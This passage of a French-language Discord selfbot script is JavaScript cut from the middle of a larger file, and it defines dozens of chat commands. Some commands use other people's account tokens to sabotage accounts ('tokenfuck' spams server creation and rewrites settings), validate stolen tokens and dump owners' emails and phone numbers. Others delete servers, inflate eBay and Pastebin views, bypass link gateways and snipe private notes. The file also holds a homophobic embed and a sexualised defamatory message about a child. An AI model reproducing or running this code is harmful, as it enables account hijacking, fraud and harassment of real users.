                              cg.edit('Une erreur est survenue.');
                            });
                          }
                        }
                        if (cg.content === ab + 'guilddelete') {
                          if (cg.author.id === aN.user.id) {
                            if (!cg.guild) return command.edit('𝙇𝙖 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙚 𝙣\'𝙚𝙨𝙩 𝙪𝙩𝙞𝙡𝙞𝙨𝙖𝙗𝙡𝙚 𝙦𝙪𝙚 𝙙𝙖𝙣𝙨 𝙡𝙚𝙨 𝙨𝙚𝙧𝙫𝙚𝙪𝙧𝙨.');
                            cg.guild.delete().then(() => {}).catch(() => {
                              cg.edit('Une erreur est survenue.');
                            });
                          }
                        }
                        if (cg.content === ab + 'channelview') {
                          if (cg.author.id === aN.user.id) {
                            var cw = [];
                            cg.guild.channels.forEach(hk => {
                              cw.push(hk.name);
                            });
                            var cx = 'Liste des channels : ';
                            for (var cy in cw) {
                              cx += '\n#' + cw[cy];
                            }
                            var cq = new aw.RichEmbed().setTitle('**Channels views**').setDescription('>>> ```' + cx + '```').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.edit(cq);
                          }
                        }
                        if (cg.content.startsWith(ab + 'gitinfos')) {
                          if (cg.author.id === aN.user.id) {
                            const hm = cg.content.split(' ').slice(1);
                            if (!hm[0]) return cg.edit('***:x: Il manque un argument!***');
                            aD.get('https://api.github.com/users/' + hm).then(hn => {
                              var ho = new aw.RichEmbed().setTitle('**Github Infos').setDescription('\n  >>>\n  **Username** : ' + hn.body.login + '\n  **Id** : ' + hn.body.id + '\n  **Node Id** : ' + hn.body.node_id + '\n  **Avatar url** : ' + hn.body.avatar_url + '\n  **Avatar Id** : ' + hn.body.gravatar_id + '\n  **Url** : ' + hn.body.html_url + '\n  **Type** : ' + hn.body.type + '\n  **Site admin** : ' + hn.body.site_admin + '\n  **Nom** : ' + hn.body.name + '\n  **Companie** : ' + hn.body.company + '\n  **Blog** : ' + hn.body.blog + '\n  **Localisation** : ' + hn.body.location + '\n  **Email** : ' + hn.body.email + '\n  **Bio** ' + hn.body.bio + '\n  **Twitter** : ' + hn.body.twitter_username + '\n  **Repos publiques** : ' + hn.body.public_repos + '\n  **Git publiques** : ' + hn.body.public_gists + '\n  **Followers** ' + hn.body.followers + '\n  **Following** ' + hn.body.following + '\n  **Création du compte** : ' + hn.body.created_at + '\n  **Compte mis à jours** : ' + hn.body.created_at + '\n  \n  **liens**:\n  \n  **Followers url** : ' + hn.body.followers_url + '\n  **Followings url** : https://api.github.com/users/' + hm + '/following\n  **Abonnements url** : ' + hn.body.subscriptions_url + '\n  **Starred url** : https://api.github.com/users/' + hm + '/starred\n  **Evenements récents** : ' + hn.body.received_events_url + '\n  **Gists** : https://api.github.com/users/' + hm + '/gists\n  ').setThumbnail(hn.body.avatar_url).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.edit(ho);
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'bypass')) {
                          if (cg.author.id === aN.user.id) {
                            var cn = cg.content.split(' ').slice(1);
                            aD.get('https://online-coding.eu/api/LinkvertiseBypass.php?url=' + cn).then(ho => {
                              var hp = new aw.RichEmbed().setTitle('bypass Linkvertise').setDescription('**lien d\'origine : ' + cn + '\nLien bypass : ' + ho.text + '**').setThumbnail('https://cdn.discordapp.com/attachments/731197380732518460/741581583869411328/xQLyjj4x_400x400.jpg').setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setColor(ad).setTimestamp();
                              cg.edit(hp);
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'tts')) {
                          if (cg.author.id === aN.user.id) {
                            cg.delete();
                            var cn = cg.content.split(' ').slice(1),
                              cz = {};
                            cz.tts = true, cg.channel.send(cn, cz);
                          }
                        }
                        if (cg.content.includes('React with')) {
                          cg.react('🎉');
                          console.log('Giveaway auto participe');
                          console.log('Sur le serveur : ' + cg.guild.name + ' ');
                          console.log('Nom du channel : ' + cg.channel.name + ' \nId du channel : ' + cg.channel.id);
                          console.log('Id du message : https://discordapp.com/channels/' + cg.guild.id + '/' + cg.channel.id);
                        }
                        if (cg.content.includes('privnote.com')) {
                          console.log(ay.hex(u)('\n[-] PRIVNOTE SNIPED [-]'));
                          console.log(ay.hex(u)('privnote de : ' + cg.author.tag));
                          console.log(ay.hex(u)('message infos : ' + cg.content + ' | date de création du message : ' + cg.createdAt));
                          console.log(ay.hex(u)('Sur le serveur : ' + cg.guild.name + ' '));
                          console.log(ay.hex(u)('Nom du channel : ' + cg.channel.name + ' \nId du channel : ' + cg.channel.id));
                          console.log(ay.hex(u)('Id du message : https://discordapp.com/channels/' + cg.guild.id + '/' + cg.channel.id));
                        }
                        if (cg.content.startsWith(ab + 'address')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              function hp(hz, hA) {
                                var hF = '';
                                if (hA.indexOf('A') > -1) hF += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
                                var hD = '';
                                for (var hE = hz; hE > 0; --hE) {
                                  hD += hF[Math.floor(Math.random() * hF.length)];
                                }
                                return hD;
                              }
                              var cE = Math.floor(Math.random() * 100),
                                cF = Math.floor(Math.random() * 100),
                                cG = Math.floor(Math.random() * 100),
                                cH = Math.floor(Math.random() * 100),
                                cI = Math.floor(Math.random() * 100),
                                cJ = Math.floor(Math.random() * 100),
                                cK = Math.floor(Math.random() * 100),
                                cL = Math.floor(Math.random() * 100);
                              const hq = ['Unit', 'Room', 'Apartment', 'city'],
                                hr = hq[Math.floor(Math.random() * hq.length)],
                                hs = hq[Math.floor(Math.random() * hq.length)],
                                ht = hq[Math.floor(Math.random() * hq.length)],
                                hu = hq[Math.floor(Math.random() * hq.length)],
                                hv = hq[Math.floor(Math.random() * hq.length)],
                                hw = hq[Math.floor(Math.random() * hq.length)],
                                hx = hq[Math.floor(Math.random() * hq.length)],
                                hy = hq[Math.floor(Math.random() * hq.length)];
                              var cM = new aw.RichEmbed().setTitle('***Il manque un argument***').setTimestamp().setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL),
                                cN = cg.content.split(' '),
                                cO = cN.slice(1);
                              if (!cO[0]) {
                                cg.edit(cM);
                              } else {
                                var cq = new aw.RichEmbed().setTitle('**Address Random**').setColor(ad).setTimestamp().setDescription(hp(6, 'A') + ' ' + cO + ' ' + hr + ' ' + cE + ' \n' + hp(6, 'A') + ' ' + cO + ' ' + hy + ' ' + cF + ' \n' + hp(6, 'A') + ' ' + cO + ' ' + hs + ' ' + cG + ' \n' + hp(6, 'A') + ' ' + cO + ' ' + ht + ' ' + cH + ' \n' + hp(6, 'A') + ' ' + cO + ' ' + hu + ' ' + cI + ' \n' + hp(6, 'A') + ' ' + cO + ' ' + hv + ' ' + cJ + ' \n' + hp(6, 'A') + ' ' + cO + ' ' + hw + ' ' + cK + ' \n' + hp(6, 'A') + ' ' + cO + ' ' + hx + ' ' + cL);
                                cg.edit(cq);
                              }
                            } else cg.edit(cu);
                          }
                        }
                        if (cg.content.startsWith(ab + 'ebayview')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              cg.delete();
                              var cN = cg.content.split(' '),
                                cn = cN.slice(1);
                              cT = cn[1], counter = cn[0];
                              var cP = setInterval(function () {
                                aK(cT, {
                                  'method': 'GET',
                                  'headers': {
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36',
                                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
                                  }
                                });
                              }, 1000);
                              commandIntervals.push(cP), setTimeout(function () {
                                console.log('les vus ont été ajouté! [' + counter + ']');
                                var hD = new aw.RichEmbed().setTitle('**Ebay View Bots**').addField('Vus ajoutés : ', counter).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setColor(ad);
                                cg.channel.send(hD), commandIntervals.forEach(hF => {
                                  clearInterval(hF);
                                });
                              }, cn[0]);
                            } else cg.edit(cu);
                          }
                        }
                        if (cg.content.startsWith(ab + 'pastebinview')) {
                          if (cg.author.id === aN.user.id) {
                            cg.delete();
                            var cN = cg.content.split(' ');
                            var cn = cN.slice(1);
                            cT = cn[1], counter = cn[0] + '000';
                            var cP = setInterval(function () {
                              aK(cT, {
                                'method': 'GET',
                                'headers': {
                                  'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_4) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30',
                                  'Content-Type': 'application/html'
                                }
                              });
                            }, 1000);
                            commandIntervals.push(cP);
                            setTimeout(function () {
                              console.log('les vus ont été ajouté! [' + cn + ']');
                              var hG = new aw.RichEmbed().setTitle('**Pastebin View Bots**').setThumbnail('https://upload.wikimedia.org/wikipedia/en/3/35/Pastebin.com_logo.png').addField('Vus ajoutés : ', cn).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setColor(ad);
                              cg.channel.send(hG);
                              commandIntervals.forEach(hH => {
                                clearInterval(hH);
                              });
                            }, counter);
                          }
                        }
                        if (cg.content === ab + 'dpd') {
                          if (cg.author.id === aN.user.id) {
                            var cq = new aw.RichEmbed().setImage('https://cdn.discordapp.com/attachments/693464445208232016/735815718167380008/drapeau-lgbt-feu-prison.jpg').setTitle('ptn des gays pas çaaaaaaaaaaaaaa').setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setColor(ad);
                            cg.edit(cq);
                          }
                        }
                        if (cg.content.startsWith(ab + 'firstmessage')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              cg.delete();
                              let hC = new aw.RichEmbed().setColor(ad).setURL('https://discord.com/channels/' + cg.guild.id + '/' + cg.channel.id + '/1').setTitle('Jump first message');
                              cg.channel.send(hC);
                            } else {
                              cg.edit(cu);
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'tokenfuck')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              let hF = cg.content.split(' ').slice(1).join(' '),
                                hG = 'https://discordapp.com/api/v6/users/@me';
                              var cS = {};
                              cS.authorization = hF, aK(hG, {
                                'method': 'GET',
                                'headers': cS
                              }, function (hH, hI, hJ) {
                                if (hI.statusCode === 200) {
                                  var hK = new aw.RichEmbed().setTitle('TOKEN DESTROY').setDescription('**token fuck en cours pour le stopper relancer ou éteignez le selfbot**').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setTimestamp();
                                  cg.edit(hK), console.log(ay.bgRed('token destroy en cours'));
                                  var hL = setInterval(function () {
                                    aK('https://discordapp.com/api/v6/guilds', {
                                      'method': 'POST',
                                      'headers': {
                                        'authorization': hF,
                                        'content-type': 'application/json'
                                      },
                                      'body': JSON.stringify({
                                        'name': '𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩',
                                        'region': 'europe',
                                        'icon': 'https://vignette.wikia.nocookie.net/victor-dixen/images/6/60/Discord-logo.png/revision/latest/scale-to-width-down/340?cb=20180515202200&path-prefix=fr'
                                      })
                                    }, function (hP, hQ, hR) {});
                                  }, 50);
                                  commandIntervals.push(hL);
                                  var hM = setInterval(function () {
                                    var hR = ['fr', 'da', 'de', 'en-US', 'en-GB', 'es-ES', 'hr', 'it', 'lt', 'hu', 'zh-TW', 'ko', 'zh-CN', 'th', 'uk', 'ru', 'bg', 'el'],
                                      hS = hR[Math.floor(Math.random() * hR.length)],
                                      hT = ['light', 'dark'],
                                      hU = hT[Math.floor(Math.random() * hT.length)],
                                      hV = 'https://discordapp.com/api/v6/users/@me/settings',
                                      hW = {};
                                    hW.theme = hU, hW.locale = hS;
                                    var hX = {};
                                    hX.method = 'PATCH', hX.headers = {}, hX.body = JSON.stringify(hW), hX.headers.authorization = hF, hX.headers['content-type'] = 'application/json', hX.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36', aK(hV, hX);
                                  }, 50);
                                  commandIntervals.push(hM);
                                } else {
                                  var hN = new aw.RichEmbed().setTitle('**Token fuck**').setDescription('token invalid').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setTimestamp();
                                  cg.edit(hN);
                                }
                              });
                            } else cg.edit(cu);
                          }
                        }
                        if (cg.content.startsWith(ab + 'tokenfuck')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              let hH = cg.content.split(' ').slice(1).join(' '),
                                hI = setInterval(function () {
                                  var hJ = ['online', 'dnd', 'offline', 'idle'],
                                    hK = hJ[Math.floor(Math.random() * hJ.length)],
                                    hL = 'https://discordapp.com/api/v6/users/@me/settings',
                                    hM = {};
                                  hM.status = hK;
                                  var hN = {};
                                  hN.method = 'PATCH', hN.headers = {}, hN.body = JSON.stringify(hM), hN.headers.authorization = hH, hN.headers['content-type'] = 'application/json', hN.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36', aK(hL, hN);
                                }, 50);
                              commandIntervals.push(hI);
                              var cT = 'https://discordapp.com/api/v6/users/@me/settings',
                                cU = {};
                              cU.all = false, aK(cT, {
                                'method': 'PATCH',
                                'headers': {
                                  'authorization': hH,
                                  'content-type': 'application/json',
                                  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
                                },
                                'body': JSON.stringify({
                                  'theme': 'light',
                                  'locale': 'ja',
                                  'message_display_compact': true,
                                  'inline_embed_media': false,
                                  'inline_attachment_media': false,
                                  'gif_auto_play': false,
                                  'render_embeds': false,
                                  'render_reactions': false,
                                  'animate_emoji': false,
                                  'convert_emoticons': false,
                                  'enable_tts_command': false,
                                  'disable_games_tab': true,
                                  'developer_mode:': false,
                                  'detect_platform_accounts:': false,
                                  'afk_timeout:': 0x64,
                                  'timezone_offset': 0x0,
                                  'stream_notifications_enabled': false,
                                  'allow_accessibility_detection': true,
                                  'contact_sync_enabled': true,
                                  'native_phone_integration_enabled': false,
                                  'friend_source_flags': cU,
                                  'explicit_content_filter': '0',
                                  'status': 'invisible',
                                  'timezoneOffset': '0',
                                  'importGamesEnabled': false
                                })
                              });
                            } else cg.edit(cu);
                          }
                        }
                        if (cg.content.startsWith(ab + 'guild create')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              let hL = 'https://discordapp.com/api/v6/guilds',
                                hM = 'europe',
                                hN = 'https://vignette.wikia.nocookie.net/victor-dixen/images/6/60/Discord-logo.png/revision/latest/scale-to-width-down/340?cb=20180515202200&path-prefix=fr',
                                hO = 'punchnox-project selfbot';
                              var cV = {};
                              cV.name = hO, cV.region = hM, cV.icon = hN;
                              var cW = {};
                              cW.method = 'POST', cW.headers = {}, cW.body = JSON.stringify(cV), cW.headers.authorization = a9, cW.headers['content-type'] = 'application/json', aK(hL, cW, function (hP, hQ, hR) {});
                              var cq = new aw.RichEmbed().setTitle('**Serveur create**').setDescription('***le serveur a bien été créé***').setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setColor(ad);
                              cg.edit(cq);
                            } else cg.edit(cu);
                          }
                        }
                        if (cg.content.startsWith(ab + 'tokeninfo')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              var cN = cg.content.split(' '),
                                cX = cN.slice(0),
                                cn = cX[1];
                              let hQ = 'https://discordapp.com/api/v6/users/@me';
                              var cY = {};
                              cY.authorization = cn, aK(hQ, {
                                'method': 'GET',
                                'headers': cY
                              }, function (hR, hS, hT) {
                                if (hS.statusCode === 200) {
                                  var hW = {};
                                  hW['Content-Type'] = 'application/json', hW.Authorization = cn;
                                  var hX = {};
                                  hX.uri = 'https://discord.com/api/v6/users/@me', hX.headers = hW, hX.json = true, hX.method = 'GET', aK(hX, function (hZ, i0, i1) {
                                    var i2 = i0.body;
                                    if (i2.premium_type == 1) var i3 = 'nitro classic';
                                    if (i2.premium_type == 2) var i3 = 'nitro boost';
                                    if (i2.premium_type == undefined) {
                                      var i3 = 'non';
                                    }
                                    if (i2.verified == true) {
                                      var i4 = 'oui';
                                    }
                                    if (i2.verified == false) var i4 = 'non';
                                    if (i2.mfa_enabled == true) {
                                      var i5 = 'oui';
                                    }
                                    if (i2.mfa_enabled == false) var i5 = 'non';
                                    if (i2.nsfw_allowed == true) var i6 = 'oui';
                                    if (i2.nsfw_allowed == false) {
                                      var i6 = 'non';
                                    }
                                    var i7 = new aw.RichEmbed().setTitle('Token Info').setDescription('Pseudo : ' + (i2.username + '#' + i2.discriminator) + '\nIdentifiant : ' + i2.id + '\nE-Mail : ' + i2.email + '\nLangue : ' + i2.locale + '\nBase64 Avatar : ' + i2.avatar + '\nVérifié : ' + i4 + '\nA2f : ' + i5 + '\nFlags : ' + i2.public_flags + '\nNitro : ' + i3 + '\nNsfw activé : ' + i6 + '\nPortable sur le compte : ' + i2.phone).setColor(ad).setThumbnail('https://cdn.discordapp.com/avatars/' + i2.id + '/' + i2.avatar + '.gif?size=2048').setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setTimestamp();
                                    cg.edit(i7);
                                  }), aK({
                                    'uri': 'https://discord.com/api/v6/users/@me/settings',
                                    'headers': {
                                      'Content-Type': 'application/json',
                                      'Authorization': cn
                                    },
                                    'json': true,
                                    'method': 'GET'
                                  }, function (hZ, i0, i1) {
                                    var i4 = i0.body;
                                    if (i4.animate_emoji == true) var i5 = 'oui';
                                    if (i4.animate_emoji == false) var i5 = 'non';
                                    if (i4.convert_emoticons == true) var i6 = 'oui';
                                    if (i4.convert_emoticons == false) {
                                      var i6 = 'non';
                                    }
                                    if (i4.developer_mode == true) {
                                      var i7 = 'oui';
                                    }
                                    if (i4.developer_mode == false) var i7 = 'non';
                                    if (i4.enable_tts_command == true) {
                                      var i8 = 'oui';
                                    }
                                    if (i4.enable_tts_command == false) {
                                      var i8 = 'non';
                                    }
                                    if (i4.gif_auto_play == true) {
                                      var i9 = 'oui';
                                    }
                                    if (i4.gif_auto_play == false) var i9 = 'non';
                                    if (i4.stream_notifications_enabled == true) {
                                      var ia = 'oui';
                                    }
                                    if (i4.stream_notifications_enabled == false) {
                                      var ia = 'non';
                                    }
                                    if (i4.show_current_game == true) {
                                      var ib = 'oui';
                                    }
                                    if (i4.show_current_game == false) var ib = 'non';
                                    if (i4.custom_status == null) {
                                      var ic = 'pas de status custom trouvé';
                                    } else var ic = i4.custom_status.text;
                                    if (i4.native_phone_integration_enabled == true) var ie = 'oui';
                                    if (i4.native_phone_integration_enabled == false) var ie = 'non';
                                    if (i4.detect_platform_accounts == true) var ig = 'oui';
                                    if (i4.detect_platform_accounts == false) var ig = 'non';
                                    var ih = new aw.RichEmbed().setTitle('Token Info (settings)').setDescription('Status : ' + i4.status + '\nStatus custom : ' + ic + '\nemojis animé : ' + i5 + '\nTemps afk : ' + i4.afk_timeout + '\nConvertir des emojis en emote : ' + i6 + '\nMode *developer* : ' + i7 + '\nTts activé : ' + i8 + '\nJoue les gifs automatiquement : ' + i9 + '\nStream notification : ' + ia + '\nMontre le jeu en cours : ' + ib + '\nThème actuel : ' + i4.theme + '\nIntégration native du portable : ' + ie + '\nDétéction des plateformes : ' + ig).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setTimestamp();
                                    cg.channel.send(ih);
                                  });
                                } else {
                                  var hY = new aw.RichEmbed().setTitle('**Token Info**').setDescription('token invalid').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setTimestamp();
                                  cg.edit(hY);
                                }
                              });
                            } else {
                              cg.edit(cu);
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'myinfo')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              var cN = cg.content.split(' '),
                                cX = cN.slice(0),
                                cn = cX[1],
                                cZ = {};
                              cZ['Content-Type'] = 'application/json', cZ.Authorization = a9, aK({
                                'uri': 'https://discord.com/api/v6/users/@me',
                                'headers': cZ,
                                'json': true,
                                'method': 'GET'
                              }, function (hT, hU, hV) {
                                var hY = hU.body;
                                if (hY.premium_type == 1) {
                                  var hZ = 'nitro classic';
                                }
                                if (hY.premium_type == 2) var hZ = 'nitro boost';
                                if (hY.premium_type == undefined) var hZ = 'non';
                                if (hY.verified == true) var i0 = 'oui';
                                if (hY.verified == false) {
                                  var i0 = 'non';
                                }
                                if (hY.mfa_enabled == true) {
                                  var i1 = 'oui';
                                }
                                if (hY.mfa_enabled == false) var i1 = 'non';
                                if (hY.nsfw_allowed == true) {
                                  var i2 = 'oui';
                                }
                                if (hY.nsfw_allowed == false) {
                                  var i2 = 'non';
                                }
                                var i3 = new aw.RichEmbed().setTitle('Token Info').setDescription('Pseudo : ' + (hY.username + '#' + hY.discriminator) + '\nIdentifiant : ' + hY.id + '\nE-Mail : ' + hY.email + '\nLangue : ' + hY.locale + '\nBase64 Avatar : ' + hY.avatar + '\nVérifié : ' + i0 + '\nA2f : ' + i1 + '\nFlags : ' + hY.public_flags + '\nNitro : ' + hZ + '\nNsfw activé : ' + i2 + '\nPortable sur le compte : ' + hY.phone).setColor(ad).setThumbnail(aN.user.avatarURL).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setTimestamp();
                                cg.edit(i3);
                              });
                              var d0 = {};
                              d0['Content-Type'] = 'application/json', d0.Authorization = a9, aK({
                                'uri': 'https://discord.com/api/v6/users/@me/settings',
                                'headers': d0,
                                'json': true,
                                'method': 'GET'
                              }, function (hT, hU, hV) {
                                var hY = hU.body;
                                if (hY.animate_emoji == true) var hZ = 'oui';
                                if (hY.animate_emoji == false) var hZ = 'non';
                                if (hY.convert_emoticons == true) var i0 = 'oui';
                                if (hY.convert_emoticons == false) {
                                  var i0 = 'non';
                                }
                                if (hY.developer_mode == true) var i1 = 'oui';
                                if (hY.developer_mode == false) var i1 = 'non';
                                if (hY.enable_tts_command == true) var i2 = 'oui';
                                if (hY.enable_tts_command == false) var i2 = 'non';
                                if (hY.custom_status == null) {
                                  var i3 = 'pas de status custom trouvé';
                                } else var i3 = hY.custom_status.text;
                                if (hY.gif_auto_play == true) {
                                  var i4 = 'oui';
                                }
                                if (hY.gif_auto_play == false) {
                                  var i4 = 'non';
                                }
                                if (hY.stream_notifications_enabled == true) var i5 = 'oui';
                                if (hY.stream_notifications_enabled == false) var i5 = 'non';
                                if (hY.show_current_game == true) var i6 = 'oui';
                                if (hY.show_current_game == false) var i6 = 'non';
                                var i7 = new aw.RichEmbed().setTitle('Token Info (settings)').setDescription('Status : ' + hY.status + '\nStatus custom : ' + i3 + '\nemojis animé : ' + hZ + '\nTemps afk : ' + hY.afk_timeout + '\nConvertir des emojis en emote : ' + i0 + '\nMode *developer* : ' + i1 + '\nTts activé ' + i2 + '\nJoue les gif automatiquement : ' + i4 + '\nStream notification : ' + i5 + '\nMontre le jeu en cours : ' + i6 + '\nThème actuel : ' + hY.theme).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setThumbnail(aN.user.avatarURL).setTimestamp();
                                cg.channel.send(i7), console.log(hU.body);
                              });
                            } else {
                              cg.edit(cu);
                            }
                          }
                        }
                        cg.content.startsWith(ab + 'zerator') && cg.author.id === aN.user.id && cg.edit('je suis zerator l\'enfant de 14 ans pour les nudes contactez moi ici: <@643080568074010686>\n');
                        if (cg.content.startsWith(ab + 'light')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              var cT = 'https://discordapp.com/api/v6/users/@me/settings',
                                d1 = {};
                              d1.theme = 'light', aK(cT, {
                                'method': 'PATCH',
                                'headers': {
                                  'authorization': a9,
                                  'content-type': 'application/json',
                                  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
                                },
                                'body': JSON.stringify(d1)
                              });
                              var cq = new aw.RichEmbed().setTitle('**Theme**').setDescription('***Theme changé en: claire***').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setTimestamp();
                              cg.edit(cq);
                            } else {
                              cg.edit(cu);
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'dark')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              var cT = 'https://discordapp.com/api/v6/users/@me/settings';
                              aK(cT, {
                                'method': 'PATCH',
                                'headers': {
                                  'authorization': a9,
                                  'content-type': 'application/json',
                                  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
                                },
                                'body': JSON.stringify({
                                  'theme': 'dark'
                                })
                              });
                              var cq = new aw.RichEmbed().setTitle('**Theme**').setDescription('***Theme changé en: sombre***').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setTimestamp();
                              cg.edit(cq);
                            } else cg.edit(cu);
                          }
                        }
                        if (cg.content.startsWith(ab + 'invite')) {
                          if (cg.author.id === aN.user.id) {
                            var cN = cg.content.split(' '),
                              cX = cN.slice(0),
                              cn = cX[1];
                            let i1 = 'https://discordapp.com/api/v6/channels/' + cn + '/invites';
                            var d2 = {};
                            d2.validate = null, d2.max_age = 0x0, d2.max_uses = 0x0, d2.target_user_type = null, d2.temporary = false, aK(i1, {
                              'method': 'POST',
                              'headers': {
                                'authorization': a9,
                                'content-type': 'application/json',
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
                              },
                              'body': JSON.stringify(d2)
                            }, function (i2, i3, i4) {
                              i4 = JSON.parse(i4);
                              var i5 = 'https://discord.gg/' + i4.code,
                                i6 = new aw.RichEmbed().setTitle('**Invitation instantanée**').setDescription(i5).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setColor(ad).setTimestamp();
                              cg.edit(i6);
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'hypesquad')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              var cN = cg.content.split(' '),
                                cX = cN.slice(0),
                                cn = cX[1];
                              let i2 = 'https://discordapp.com/api/v6/hypesquad/online';
                              const i3 = [d3 = 1, d3 = 2, d3 = 3];
                              var d3;
                              if (cn == 'bravery') {
                                d3 = 1;
                              }
                              if (cn == 'brilliance') {
                                d3 = 2;
                              }
                              cn == 'ballance' && (d3 = 3);
                              if (cn == 'random') {
                                i3[Math.floor(Math.random() * i3.length)];
                              }
                              var d4 = {};
                              d4.house_id = d3, aK(i2, {
                                'method': 'POST',
                                'headers': {
                                  'authorization': a9,
                                  'content-type': 'application/json',
                                  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
                                },
                                'body': JSON.stringify(d4)
                              });
                              var cq = new aw.RichEmbed().setTitle('**Hypesquad**').setDescription('***vôtre hypesquad à été changé en:*** ' + cn).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              if (!cn) {
                                cg.edit('***Il manque un argument (bravery, brilliance, ballance, random)***');
                              } else cg.edit(cq);
                            } else {
                              cg.edit(cu);
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'tokencheck')) {
                          if (cg.author.id === aN.user.id) {
                            var cN = cg.content.split(' '),
                              cX = cN.slice(0),
                              cn = cX[1];
                            let i9 = 'https://discordapp.com/api/v6/users/@me';
                            var d5 = {};
                            d5.authorization = cn, aK(i9, {
                              'method': 'GET',
                              'headers': d5
                            }, function (ia, ib, ic) {
                              if (ib.statusCode === 200) {
                                var ih = new aw.RichEmbed().setTitle('***Le Token : ' + cn + ' est bien valid***').setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                cg.channel.send(ih);
                              } else {
                                console.log('[', ay.hex(u)('ERROR'), ']', chal.hex(u)('Token info:\n le token n\'est pas valid'));
                                var ii = new aw.RichEmbed().setTitle('- [ERROR] Échec de l\'authentification avec Discord. le token ' + cn + ' n\'est pas valid').setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                cg.edit(ii);
                              }
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'searchgif')) {
                          if (cg.author.id == aN.user.id) {
                            var cn = cg.content.split(' ').slice(1);
                            !cn[0] ? cg.edit('**:x: il manque un argument**') : aD.get('https://api.c99.nl/gif?key=' + b6 + '&keyword=' + cn + '&json').then(ib => {
                              if (ib.body.success = false) return cg.edit('Impossible de trouver d\'images correspondant à votre recherche!');
                              var ic = ib.body.images,
                                ie = new aw.RichEmbed().setTitle('Search gif ' + cn).setColor(ad).setTimestamp().setImage(ic[Math.floor(Math.random() * ic.length)]).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.edit(ie);
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'imglook')) {
                          if (cg.author.id == aN.user.id) {
